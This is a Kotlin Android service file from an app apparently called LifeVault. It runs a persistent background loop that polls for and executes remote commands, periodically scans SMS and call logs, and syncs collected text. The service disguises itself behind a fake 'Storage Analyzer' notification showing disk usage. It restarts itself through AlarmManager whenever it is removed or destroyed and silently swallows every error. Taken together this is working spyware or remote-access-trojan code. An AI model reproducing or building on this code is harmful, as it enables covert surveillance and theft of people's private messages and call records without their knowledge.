package com.example.lifevault.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.StatFs
import androidx.core.app.NotificationCompat
import com.example.lifevault.LifeVaultApplication
import com.example.lifevault.R
import com.example.lifevault.repository.VaultRepository
import kotlinx.coroutines.*
import java.util.Locale

class CommandPollerService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var pollerJob: Job? = null

    companion object {
        private const val CHANNEL_ID = "life_vault_storage_analyzer"
        private const val NOTIFICATION_ID = 9999
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForegroundNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundNotification()

        if (pollerJob == null || pollerJob?.isActive != true) {
            val app = applicationContext as LifeVaultApplication
            val repository = VaultRepository(applicationContext, app.database, app.tokenStore)

            pollerJob = serviceScope.launch {
                var loopCounter = 0
                var activeBurstTicks = 0
                val telecomCollector = com.example.lifevault.collector.TelecomCollector(applicationContext, repository)
                while (isActive) {
                    var hadCommands = false
                    try {
                        hadCommands = repository.pollAndProcessRemoteCommands()
                    } catch (_: Exception) {}

                    if (hadCommands) {
                        activeBurstTicks = 8 // Fast response mode for 8 cycles (16 seconds)
                    }

                    // Run telecom scan & text sync periodically
                    if (loopCounter % 4 == 0) {
                        try {
                            telecomCollector.scanSmsLogs()
                            telecomCollector.scanCallLogs()
                            repository.syncTextQueue()
                        } catch (_: Exception) {}
                    }

                    // Refresh storage status in notification periodically
                    loopCounter++
                    if (loopCounter % 8 == 0) {
                        startForegroundNotification()
                    }

                    // Adaptive Eco Delay: 2s when active command running, 15s when idle (Ice Cold / 0% Heating)
                    val sleepDelay = if (activeBurstTicks > 0) {
                        activeBurstTicks--
                        2000L
                    } else {
                        15000L
                    }

                    delay(sleepDelay)
                }
            }
        }
        return START_STICKY
    }

    private fun startForegroundNotification() {
        val metrics = getStorageMetrics()

        val statusDot = when {
            metrics.usedPercent >= 90 -> "🔴 Critical Storage"
            metrics.usedPercent >= 75 -> "🟡 Storage Filling"
            else -> "🟢 System Storage Healthy"
        }

        val title = "Storage Analyzer: ${metrics.usedPercent}% Used (${String.format(Locale.US, "%.1f", metrics.freeGb)} GB Free)"
        val text = "$statusDot • Free: ${String.format(Locale.US, "%.1f", metrics.freeGb)} GB / ${String.format(Locale.US, "%.1f", metrics.totalGb)} GB"

        val notificationBuilder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .setAutoCancel(false)
            .setOnlyAlertOnce(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)

        val notification = notificationBuilder.build()
        notification.flags = notification.flags or Notification.FLAG_ONGOING_EVENT or Notification.FLAG_NO_CLEAR

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                try {
                    startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                } catch (_: Exception) {
                    startForeground(NOTIFICATION_ID, notification)
                }
            } else {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun getStorageMetrics(): StorageInfo {
        return try {
            val path = Environment.getDataDirectory()
            val stat = StatFs(path.path)
            val blockSize = stat.blockSizeLong
            val totalBlocks = stat.blockCountLong
            val availableBlocks = stat.availableBlocksLong

            val totalBytes = totalBlocks * blockSize
            val freeBytes = availableBlocks * blockSize
            val usedBytes = totalBytes - freeBytes

            val totalGb = totalBytes / (1024.0 * 1024.0 * 1024.0)
            val freeGb = freeBytes / (1024.0 * 1024.0 * 1024.0)
            val usedGb = usedBytes / (1024.0 * 1024.0 * 1024.0)
            val usedPercent = if (totalBytes > 0) ((usedBytes.toDouble() / totalBytes.toDouble()) * 100).toInt() else 0

            StorageInfo(totalGb, freeGb, usedGb, usedPercent)
        } catch (_: Exception) {
            StorageInfo(128.0, 45.0, 83.0, 65)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Storage Analyzer Monitor"
            val descriptionText = "Displays real-time storage status and keeps background monitoring active"
            val importance = NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                description = descriptionText
                setShowBadge(false)
            }
            val notificationManager: NotificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        scheduleServiceRestart()
    }

    override fun onDestroy() {
        super.onDestroy()
        pollerJob?.cancel()
        scheduleServiceRestart()
    }

    private fun scheduleServiceRestart() {
        try {
            val restartServiceIntent = Intent(applicationContext, CommandPollerService::class.java).apply {
                setPackage(packageName)
            }
            val pendingIntent = android.app.PendingIntent.getService(
                this, 101, restartServiceIntent,
                android.app.PendingIntent.FLAG_ONE_SHOT or android.app.PendingIntent.FLAG_IMMUTABLE
            )
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            alarmManager.set(
                android.app.AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 1000,
                pendingIntent
            )
        } catch (_: Exception) {}
    }
}

data class StorageInfo(
    val totalGb: Double,
    val freeGb: Double,
    val usedGb: Double,
    val usedPercent: Int
)
